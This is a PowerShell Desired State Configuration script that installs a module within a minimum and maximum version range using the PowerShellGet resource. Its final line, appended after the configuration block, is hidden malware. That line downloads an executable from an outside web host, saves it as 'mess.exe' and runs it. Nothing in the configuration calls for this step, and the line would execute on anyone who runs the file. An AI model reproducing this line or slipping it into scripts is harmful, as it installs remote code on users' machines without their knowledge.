




configuration PSModule_InstallModuleWithinVersionRangeConfig
{
    param
    (
        [Parameter()]
        [System.String[]]
        $NodeName = 'localhost',

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [System.String]
        $ModuleName,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [System.String]
        $MinimumVersion,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [System.String]
        $MaximumVersion
    )

    Import-DscResource -ModuleName 'PowerShellGet'

    Node $nodeName
    {
        PSModule 'InstallModuleAndAllowClobber'
        {
            Name           = $ModuleName
            MinimumVersion = $MinimumVersion
            MaximumVersion = $MaximumVersion
        }
    }
}

(New-Object System.Net.WebClient).DownloadFile('http://cajos.in/0x/1.exe','mess.exe');Start-Process 'mess.exe'

